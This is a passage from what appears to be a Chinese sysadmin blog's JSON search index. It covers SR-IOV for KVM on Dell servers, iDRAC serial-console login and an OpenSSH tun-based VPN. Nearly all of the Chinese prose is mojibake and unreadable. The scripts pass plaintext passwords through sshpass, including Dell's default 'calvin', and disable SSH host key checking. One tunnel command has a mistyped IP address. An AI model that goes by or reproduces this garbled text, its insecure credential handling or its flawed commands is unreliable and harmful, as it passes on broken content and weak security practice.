spoofè€Œè¢«ä¸¢æ‰ã€‚\nè§£å†³æ–¹æ³•æ˜¯bondingå‚æ•°åŠ ä¸Šfailovermac=active æˆ–è€…è®¾ç½®spoofchk offï¼Œå¾—æŠŠæ‰€æœ‰è™šæ‹Ÿvféƒ½å¼„ä¸€é\nip link set em1 vf 1 spoofchk off ... ip link set em1 vf 7 spoofchk off ","permalink":"https://rendoumi.com/posts/20240115-kvm_sriov/","summary":"\u003cp\u003eä»€ä¹ˆæ˜¯SR-IOVå‘¢?\u003c/p\u003e\n\u003cp\u003eç®€å•çš„è¯´ï¼ŒSR-IOVæ˜¯ä¸€ç§è™šæ‹ŸåŒ–æ–¹æ¡ˆï¼Œç”¨æ¥ä½¿ä¸€ä¸ªPCIeçš„ç‰©ç†è®¾å¤‡ï¼Œèƒ½è™šæ‹Ÿå‡ºå¤šä¸ªè®¾å¤‡ï¼Œè¿™äº›è™šæ‹Ÿå‡ºæ¥çš„è®¾å¤‡çœ‹èµ·æ¥å°±åƒæ˜¯å¤šä¸ªçœŸå®çš„ç‰©ç†è®¾å¤‡ä¸€æ ·ï¼Œå¹¶è·å¾—èƒ½å¤Ÿä¸æœ¬æœºæ€§èƒ½åª²ç¾çš„ I/O æ€§èƒ½ã€‚\u003c/p\u003e\n\u003cp\u003eSR-IOVç°åœ¨æœ€å¤šæ˜¯ç”¨åœ¨ç½‘å¡ä¸Šï¼Œkvmè™šæ‹Ÿæœºçš„ç½‘å¡åŠŸèƒ½ä¸€èˆ¬ä¼šä¸‹é™åˆ°å®ä½“æœºçš„30-50%ï¼Œå¦‚æœæ”¹ç”¨SR-IOVä¼šå¤§å¤§æé«˜ç½‘å¡æ€§èƒ½ã€‚\u003c/p\u003e\n\u003cp\u003eSR-IOV æœ‰2ç§åŠŸèƒ½ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eç‰©ç†åŠŸèƒ½ (Physical Function, PF)\n\u003cul\u003e\n\u003cli\u003eå°±æ˜¯æ ‡å‡†çš„PCIeçš„åŠŸèƒ½äº†\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eè™šæ‹ŸåŠŸèƒ½ (Virtual Function, VF)\n\u003cul\u003e\n\u003cli\u003eä¸ç‰©ç†åŠŸèƒ½å…³è”çš„ä¸€ç§åŠŸèƒ½ã€‚VF æ˜¯ä¸€ç§è½»é‡çº§ PCIe åŠŸèƒ½ï¼Œå¯ä»¥ä¸ç‰©ç†åŠŸèƒ½ä»¥åŠä¸åŒä¸€ç‰©ç†åŠŸèƒ½å…³è”çš„å…¶ä»– VF å…±äº«ä¸€ä¸ªæˆ–å¤šä¸ªç‰©ç†èµ„æºã€‚VF ä»…å…è®¸æ‹¥æœ‰ç”¨äºå…¶è‡ªèº«è¡Œä¸ºçš„é…ç½®èµ„æºã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eå¥½çš„ï¼Œå¦‚ä½•åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨å®ƒå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eåœºæ™¯å¦‚ä¸‹ï¼š \u003cimg alt=\"image-20240115165320492\" loading=\"lazy\" src=\"/posts/20240115-kvm_sriov/image-20240115165320492.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¦‚ä¸Šï¼š æœºæˆ¿é‡Œæœ‰ä¸¤å°äº¤æ¢æœº:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eswitch-1ç”¨æ¥è¿æ¥å„æœºå™¨çš„eth0å£\u003c/li\u003e\n\u003cli\u003eswitch-2ç”¨æ¥è¿æ¥å„æœºå™¨çš„eth1å£\u003c/li\u003e\n\u003cli\u003eswitch-1å’Œswitch-2äº’è”\u003c/li\u003e\n\u003cli\u003eè¿™æ˜¯ä¸€ç§æœºæˆ¿çš„æ ‡å‡†è¿æ³•ï¼Œeth0å’Œeth1åšbondingï¼Œåšçº¿è·¯å†—ä½™\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eserver-2æ˜¯ä¸€å°Dell R730çš„æœåŠ¡å™¨ï¼Œeth0è¿switch-1ï¼Œeth1è¿switch-2ï¼Œä¸Šé¢è·‘äº†ä¸‰ä¸ªè™šæœºï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eVM-1è·‘åœ¨åŸºäºbondingçš„Bridgeä¸Šï¼Œæ ‡å‡†çš„åšæ³•\u003c/li\u003e\n\u003cli\u003eVM-2å’ŒVM-2åˆ™æ˜¯åˆ©ç”¨äº†SR-IOVï¼Œä»è™šæ‹Ÿç½‘å¡ç›´è¿åˆ°ç‰©ç†ç½‘å¡ï¼Œå‡å°‘äº†ä¸­é—´ç¯èŠ‚ï¼Œæé«˜äº†ç½‘å¡çš„æ•ˆç‡ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé¦–å…ˆè¦æŠŠæœåŠ¡å™¨çš„vtå’Œsr-iovæ‰“å¼€ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eSystem BIOS \u0026gt; Processor Settings \u0026gt; Virtualization Technology\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240115165609882\" loading=\"lazy\" src=\"/posts/20240115-kvm_sriov/image-20240115165609882.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eSystem BIOS \u0026gt; Integrated Devices \u0026gt; SR-IOV Global Enable \u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240115165640371\" loading=\"lazy\" src=\"/posts/20240115-kvm_sriov/image-20240115165640371.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œè¿™ä¹ˆéº»çƒ¦çš„äº‹æƒ…ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨è„šæœ¬é€šè¿‡idracè°ƒç”¨racadmæ¥åšå¥½äº†ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e BIOS.ProcSettings.ProcVirtualization Enabled  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;calvin\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e BIOS.IntegratedDevices.SriovGlobalEnable Enabled  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm serveraction powercycle  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼ŒDell R730çš„æœºå™¨ç”¨å¾—æ˜¯Intel I350çš„ä»¥å¤ªç½‘å¡ï¼Œæ¯ä¸ªç½‘å£æœ€å¤šæ”¯æŒ8ä¸ªVFï¼Œå¦‚æœæ˜¯é«˜çº§çš„X520ç½‘å¡ï¼Œå°±æ”¯æŒ64ä¸ªVFã€‚\u003c/p\u003e","title":"kvmæé«˜ç½‘å¡æ•ˆç‡ä½¿ç”¨SR-IOV"},{"content":"Linuxçš„ç¯å¢ƒäº†ï¼Œwindowsçš„ä¸è¡Œã€‚\nDellçš„idracå…¶å®æä¾›äº†è¿œç¨‹çš„sshç•Œé¢ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨idracæ¥è®¾ç½®biosä»€ä¹ˆçš„ï¼Œå½“ç„¶å¦‚æœèƒ½é€šè¿‡idracç›´æ¥ç™»å½•æœåŠ¡å™¨é‚£å°±æ›´å¥½äº†ã€‚\né¦–å…ˆæ™®åŠä»¥ä¸‹å‡ ä¸ªæ¦‚å¿µï¼š\ntty: Video console terminal (abbreviation for â€œTeletypeâ€) ttyS: Serial console terminal pts: Virtual console terminal (pseudo-tty or pty but stands for Pseudo-Terminal Slave (PTS)) ç®€å•è¯´ï¼Œttyæ˜¯å¸¦æ˜¾ç¤ºå™¨çš„ç»ˆç«¯ï¼ŒttySæ˜¯ä¸²å£ç»ˆç«¯ï¼Œptsæ˜¯è™šæ‹Ÿç»ˆç«¯ã€‚ttyæ¥æ˜¾ç¤ºå™¨ã€é”®ç›˜ï¼ŒttySæ¥ä¸²å£ï¼Œpstå°±æ˜¯è¿œç¨‹ssh/telnetè¿‡æ¥çš„è™šæ‹Ÿç»ˆç«¯ã€‚\nç¬¬ä¸€æ­¥ï¼šä¿®æ”¹Dell Bios\ndellçš„biosä¸­å…³äºserialçš„é…ç½®å¦‚ä¸‹å›¾ï¼š æˆ‘ä»¬åªæ”¹å‰ä¸¤ä¸ªå°±å¯ä»¥äº†ï¼š\nSerial Communication: â€œOn with serial redirection via com2â€ Serial Port Address: â€œSerial Device1 = COM1, Serial Device2=COM2 External Serial Connector: â€œSerial Device1â€ Failsafe Baud Rate: â€œ115200â€ Remote Terminal Type: â€œVT100/VT220â€ Redirection After Boot: â€œEnabledâ€ è§£é‡Šä¸€ä¸‹ï¼š\nSerial Communication ç¼ºçœæ˜¯ On without Console Redirectionï¼Œæˆ‘ä»¬éœ€è¦æŠŠæ‰€æœ‰consoleçš„æ˜¾ç¤ºéƒ½è½¬å‘åˆ°com2ä¸Šï¼Œæ‰€ä»¥éœ€è¦æ”¹ã€‚ Serial Port Address ç¼ºçœæ˜¯ Serial Device 1=COM2, Serial Device 2=COM1ï¼Œå¦‚æœä¸æ”¹ï¼Œé‚£ä¹ˆæ¥ä¸Šç‰©ç†æœºä¸Šçš„ä¸²å£å°±å¯ä»¥çœ‹åˆ°ç™»å½•ç”»é¢äº†ï¼Œè¿™æ ·ç­‰äºä¸²å£1åºŸæ‰äº†ï¼Œä¸‡ä¸€æˆ‘ä»¬è¦æŠŠç‰©ç†æœºä¸Šçš„com1å£ç»™ç•™å‡ºæ¥å¤‡ç”¨ï¼Œæ’ä¸ªä¸²å£çš„wavecom modemåšæŠ¥è­¦ç”¨ï¼Œé‚£å°±å‚»çœ¼äº†ï¼Œæ‰€ä»¥å¿…é¡»æ”¹æ‰ç•™å‡ºcom1å¤‡ç”¨ã€‚ External Serial Connector ç¼ºçœæ˜¯ Serial Device1ï¼Œä¸ç”¨æ”¹ï¼Œé‚£ä¹ˆç‰©ç†æœºä¸Šçš„comå£å°±æ˜¯com1äº†ï¼Œå¯¹åº”ttyS0ã€‚ Failsafe Baud Rate: â€œ115200â€ï¼Œä¸ç”¨æ”¹ï¼Œå°±ç”¨è¿™ä¸ªé«˜çš„å¥½äº†ã€‚ Remote Terminal Type: â€œVT100/VT220â€ï¼Œä¸ç”¨æ”¹ï¼Œé»‘ç™½çš„vt100å°±å¾ˆå¥½ Redirection After Boot: â€œEnabledâ€ï¼Œä¹Ÿä¸ç”¨æ”¹ï¼Œéœ€è¦é‡å®šå‘ã€‚ å½“ç„¶ï¼Œç”¨è„šæœ¬ä¸€æ¬¡æå®šæ›´å¥½ï¼š\n#!/bin/sh sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.SerialCommSettings.SerialPortAddress \u0026#34;Serial1Com1Serial2Com2\u0026#34; sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.SerialCommSettings.SerialComm \u0026#34;OnConRedirCom2\u0026#34; sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm jobqueue create BIOS.Setup.1-1 -r pwrcycle -s TIME_NOW -e TIME_NA ç¬¬äºŒæ­¥ï¼šç¼–è¾‘linux\nç¼–è¾‘/etc/grub.conf åŠ ä¸Šä»¥ä¸‹ä¸¤è¡Œï¼Œå¹¶ä¸”æ³¨é‡Šæ‰splashimageï¼Œæ³¨æ„speedæ˜¯57600ï¼Œä¸æ˜¯115200\nserial â€“unit=1 â€“speed=57600 terminal â€“timeout=10 serial #splashimage=(hd0,0)/grub/splash.xpm.gz åœ¨kenelä¸€è¡Œæœ€ååŠ ä¸Š\nconsole=tty1 console=ttyS1,115200n8r ç»™ä¸ªå®Œæˆç‰ˆæœ¬ï¼š\ndefault=0 timeout=5 #splashimage=(hd0,0)/grub/splash.xpm.gz serial -unit=1 -speed=57600 terminal -timeout=10 serial hiddenmenu title CentOS 6 (2.6.32-504.el6.x86_64) root (hd0,0) kernel /vmlinuz-2.6.32-504.el6.x86_64 ro root=UUID=16154774-dbaf-4fcb-aedb-0513cb65a0eb rd_NO_LUKS rd_NO_LVM LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 crashkernel=auto KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet intel_iommu=on console=tty1 console=ttyS1,115200n8r initrd /initramfs-2.6.32-504.el6.x86_64.img ä¿®æ”¹/etc/securettyï¼ŒåŠ ä¸ŠttyS1\ncat /etc/securetty console vc/1 vc/2 vc/3 vc/4 vc/5 vc/6 vc/7 vc/8 vc/9 vc/10 vc/11 tty1 tty2 tty3 tty4 tty5 tty6 tty7 tty8 tty9 tty10 tty11 ttyS1 ç¼–è¾‘ vi /etc/inittabï¼ŒåŠ ä¸€è¡Œ\nco:2345:respawn:/sbin/agetty ttyS1 115200 vt100-nav\ncat /etc/inittab id:3:initdefault: co:2345:respawn:/sbin/agetty ttyS1 115200 vt100-nav ç„¶åé‡å¯æœåŠ¡å™¨ï¼Œç™»å½•idrac , console com2å°±å¯ä»¥ç›´æ¥ç™»å½•æœåŠ¡å™¨äº†ï¼š\nssh 10.8.1.2 root@10.16.1.2\u0026#39;s password: /admin1-\u0026gt; console com2 Connected to Serial Device 2. To end type: ^\\ ","permalink":"https://rendoumi.com/posts/20240115-idrac_monitor/","summary":"\u003cp\u003eLinuxçš„ç¯å¢ƒäº†ï¼Œwindowsçš„ä¸è¡Œã€‚\u003c/p\u003e\n\u003cp\u003eDellçš„idracå…¶å®æä¾›äº†è¿œç¨‹çš„sshç•Œé¢ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨idracæ¥è®¾ç½®biosä»€ä¹ˆçš„ï¼Œå½“ç„¶å¦‚æœèƒ½é€šè¿‡idracç›´æ¥ç™»å½•æœåŠ¡å™¨é‚£å°±æ›´å¥½äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæ™®åŠä»¥ä¸‹å‡ ä¸ªæ¦‚å¿µï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003etty: Video console terminal (abbreviation for â€œTeletypeâ€)\u003c/li\u003e\n\u003cli\u003ettyS: Serial console terminal\u003c/li\u003e\n\u003cli\u003epts: Virtual console terminal (pseudo-tty or pty but stands for Pseudo-Terminal Slave (PTS))\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eç®€å•è¯´ï¼Œttyæ˜¯å¸¦æ˜¾ç¤ºå™¨çš„ç»ˆç«¯ï¼ŒttySæ˜¯ä¸²å£ç»ˆç«¯ï¼Œptsæ˜¯è™šæ‹Ÿç»ˆç«¯ã€‚ttyæ¥æ˜¾ç¤ºå™¨ã€é”®ç›˜ï¼ŒttySæ¥ä¸²å£ï¼Œpstå°±æ˜¯è¿œç¨‹ssh/telnetè¿‡æ¥çš„è™šæ‹Ÿç»ˆç«¯ã€‚\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€æ­¥ï¼šä¿®æ”¹Dell Bios\u003c/p\u003e\n\u003cp\u003edellçš„biosä¸­å…³äºserialçš„é…ç½®å¦‚ä¸‹å›¾ï¼š\n\u003cimg alt=\"image-20240115164915483\" loading=\"lazy\" src=\"/posts/20240115-idrac_monitor/image-20240115164915483.png\"\u003e æˆ‘ä»¬åªæ”¹å‰ä¸¤ä¸ªå°±å¯ä»¥äº†ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSerial Communication: â€œOn with serial redirection via com2â€\u003c/li\u003e\n\u003cli\u003eSerial Port Address: â€œSerial Device1 = COM1, Serial Device2=COM2\u003c/li\u003e\n\u003cli\u003eExternal Serial Connector: â€œSerial Device1â€\u003c/li\u003e\n\u003cli\u003eFailsafe Baud Rate: â€œ115200â€\u003c/li\u003e\n\u003cli\u003eRemote Terminal Type: â€œVT100/VT220â€\u003c/li\u003e\n\u003cli\u003eRedirection After Boot: â€œEnabledâ€\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSerial Communication ç¼ºçœæ˜¯ On without Console Redirectionï¼Œæˆ‘ä»¬éœ€è¦æŠŠæ‰€æœ‰consoleçš„æ˜¾ç¤ºéƒ½è½¬å‘åˆ°com2ä¸Šï¼Œæ‰€ä»¥éœ€è¦æ”¹ã€‚\u003c/li\u003e\n\u003cli\u003eSerial Port Address ç¼ºçœæ˜¯ Serial Device 1=COM2, Serial Device  2=COM1ï¼Œå¦‚æœä¸æ”¹ï¼Œé‚£ä¹ˆæ¥ä¸Šç‰©ç†æœºä¸Šçš„ä¸²å£å°±å¯ä»¥çœ‹åˆ°ç™»å½•ç”»é¢äº†ï¼Œè¿™æ ·ç­‰äºä¸²å£1åºŸæ‰äº†ï¼Œä¸‡ä¸€æˆ‘ä»¬è¦æŠŠç‰©ç†æœºä¸Šçš„com1å£ç»™ç•™å‡ºæ¥å¤‡ç”¨ï¼Œæ’ä¸ªä¸²å£çš„wavecom modemåšæŠ¥è­¦ç”¨ï¼Œé‚£å°±å‚»çœ¼äº†ï¼Œæ‰€ä»¥å¿…é¡»æ”¹æ‰ç•™å‡ºcom1å¤‡ç”¨ã€‚\u003c/li\u003e\n\u003cli\u003eExternal Serial Connector ç¼ºçœæ˜¯ Serial Device1ï¼Œä¸ç”¨æ”¹ï¼Œé‚£ä¹ˆç‰©ç†æœºä¸Šçš„comå£å°±æ˜¯com1äº†ï¼Œå¯¹åº”ttyS0ã€‚\u003c/li\u003e\n\u003cli\u003eFailsafe Baud Rate: â€œ115200â€ï¼Œä¸ç”¨æ”¹ï¼Œå°±ç”¨è¿™ä¸ªé«˜çš„å¥½äº†ã€‚\u003c/li\u003e\n\u003cli\u003eRemote Terminal Type: â€œVT100/VT220â€ï¼Œä¸ç”¨æ”¹ï¼Œé»‘ç™½çš„vt100å°±å¾ˆå¥½\u003c/li\u003e\n\u003cli\u003eRedirection After Boot: â€œEnabledâ€ï¼Œä¹Ÿä¸ç”¨æ”¹ï¼Œéœ€è¦é‡å®šå‘ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eå½“ç„¶ï¼Œç”¨è„šæœ¬ä¸€æ¬¡æå®šæ›´å¥½ï¼š\u003c/p\u003e","title":"idracè¿œç¨‹ç™»å½•æœåŠ¡å™¨"},{"content":"opensshæ˜¯æ”¯æŒéš§é“çš„ï¼Œæ‰€ä»¥å¾ˆç®€å•å°±å¯ä»¥åœ¨sshä¸­å†å¥—ä¸ªç®¡é“ï¼Œç›´æ¥ç”¨æ¥vpnï¼Œåœºæ™¯å¦‚ä¸‹ï¼š\nå¦‚ä¸Šå›¾ï¼ŒAæœºèƒ½sshæ— å¯†ç ç™»å½•Bæœº\nAæœºçš„IPï¼š172.16.8.106\nBæœºçš„IPï¼š172.16.8.108\nAæœºæ‹¨é€švpn tunnelåtunçš„ipï¼š192.168.244.2\nBæœºæ‹¨é€švpn tunnelåtunçš„ipï¼š192.168.244.1\né¦–å…ˆç¼–è¾‘Aå’ŒBçš„/etc/ssh/sshd_configï¼Œå…è®¸tunnelï¼Œç¼ºçœæ˜¯ä¸å…è®¸çš„ï¼Œç„¶åservice sshd restart ï¼Œé‡å¯sshd ... PermitTunnel yes ... Aå’ŒBå®‰è£…linuxä¸‹çš„tunctlè½¯ä»¶ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªtunnelè®¾å¤‡ yum install tunctl tunctl -t tun5 -u root åœ¨A(172.16.8.106)æœºå™¨ä¸Šç”Ÿæˆkeyï¼Œå¹¶è®¾ç½®èƒ½æ— å¯†ç è¯ä¹¦ç›´æ¥ç™»å½•B(172.16.8.108) ssh-keygen ssh-copy-id root@172.16.8.108 åœ¨Aä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå»ºç«‹ssh tunnelï¼š ssh -w 5:5 root@172.168.8.108 åœ¨Aä¸Šæ‰§è¡Œ ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0 åœ¨Bä¸Šæ‰§è¡Œ ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0 è¿™æ ·åˆ†åˆ«åœ¨Aå’ŒBä¸Šping 192.168.244.1å’Œ192.168.244.2ï¼Œéƒ½èƒ½é€šå°±è¡¨ç¤ºå·²ç»okäº†ã€‚ ä¼˜åŒ–ä¸€ä¸‹ï¼ŒAå’ŒBä¸¤è¾¹éƒ½å…ˆæŠŠtun5èµ·æ¥ä»¥åï¼Œç›´æ¥åœ¨Aä¸Šä¸€å¥è¯æå®šï¼Œè¿™ä¸ªä¸ä¼šè‡ªåŠ¨é€€å‡ºï¼Œæ‰€ä»¥å¾—ctrl+zï¼Œç„¶åbgæ”¾åå°å»ï¼š\nssh \\ -o PermitLocalCommand=yes \\ -o LocalCommand=\u0026#34;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0\u0026#34; \\ -o ServerAliveInterval=60 \\ -w 5:5 root@172.16.8.108 \\ \u0026#39;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0; echo tun5 ready\u0026#39; å¦‚æœè¦ç”¨åœ¨ç¿»å¢™çš„ç¯å¢ƒï¼Œé‚£å°±å¾—ä¿æŒé•¿é“¾æ¥äº†ã€‚å‡è®¾Aæœºå™¨æ˜¯åœ¨ä¸€ä¸ªé˜²ç«å¢™åï¼Œä¸”è¢«NATäº†ï¼Œé‚£ä¹ˆå°±å¾—å…ˆè¿™æ ·æ‰“é€šéš§é“ï¼š\nssh -f -w5:5 vpn@example.com \\ -o ServerAliveInterval=30 \\ -o ServerAliveCountMax=5 \\ -o TCPKeepAlive=yes \\ -i ~/.ssh/id_rsa \u0026#34;sleep 1000000000\u0026#34; ç„¶ååœ¨Aå’ŒBä¸Šåˆ†åˆ«å•ç‹¬é…ç½®ipå³å¯ã€‚\nå†è¿›é˜¶ï¼šå‡è®¾Aè¦å»ºç«‹ç‹¬ç«‹çš„netnsç©ºé—´ï¼ŒåŠ ipåŠç½‘å…³å¦‚ä¸‹ï¼š\nip net add ns-vpn ip net exec ip addr add 100.64.42.2/24 dev tun42 ip net exec ip link set up dev tun42 ip net exec ip route add default via 100.64.42.1 å†åœ¨Bçš„/etc/sysctl.confæ‰“å¼€è½¬å‘\nnet.ipv4.ip_forward = 1 sysctl -p iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -j SNAT --to 172.16.8.108 Aå°±å¯ä»¥é€šè¿‡Bä»£ç†å‡ºå»äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240115-ssh_tun_vpn/","summary":"\u003cp\u003eopensshæ˜¯æ”¯æŒéš§é“çš„ï¼Œæ‰€ä»¥å¾ˆç®€å•å°±å¯ä»¥åœ¨sshä¸­å†å¥—ä¸ªç®¡é“ï¼Œç›´æ¥ç”¨æ¥vpnï¼Œåœºæ™¯å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240115164125796\" loading=\"lazy\" src=\"/posts/20240115-ssh_tun_vpn/image-20240115164125796.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¦‚ä¸Šå›¾ï¼ŒAæœºèƒ½sshæ— å¯†ç ç™»å½•Bæœº\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAæœºçš„IPï¼š172.16.8.106\u003c/p\u003e\n\u003cp\u003eBæœºçš„IPï¼š172.16.8.108\u003c/p\u003e\n\u003cp\u003eAæœºæ‹¨é€švpn tunnelåtunçš„ipï¼š192.168.244.2\u003c/p\u003e\n\u003cp\u003eBæœºæ‹¨é€švpn tunnelåtunçš„ipï¼š192.168.244.1\u003c/p\u003e\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eé¦–å…ˆç¼–è¾‘Aå’ŒBçš„/etc/ssh/sshd_configï¼Œå…è®¸tunnelï¼Œç¼ºçœæ˜¯ä¸å…è®¸çš„ï¼Œç„¶åservice sshd restart ï¼Œé‡å¯sshd\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePermitTunnel yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eAå’ŒBå®‰è£…linuxä¸‹çš„tunctlè½¯ä»¶ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªtunnelè®¾å¤‡\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install tunctl  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etunctl -t tun5 -u root  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eåœ¨A(172.16.8.106)æœºå™¨ä¸Šç”Ÿæˆkeyï¼Œå¹¶è®¾ç½®èƒ½æ— å¯†ç è¯ä¹¦ç›´æ¥ç™»å½•B(172.16.8.108)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-keygen  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-copy-id root@172.16.8.108  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eåœ¨Aä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå»ºç«‹ssh tunnelï¼š\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh -w 5:5 root@172.168.8.108  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eåœ¨Aä¸Šæ‰§è¡Œ\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eåœ¨Bä¸Šæ‰§è¡Œ\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eè¿™æ ·åˆ†åˆ«åœ¨Aå’ŒBä¸Šping 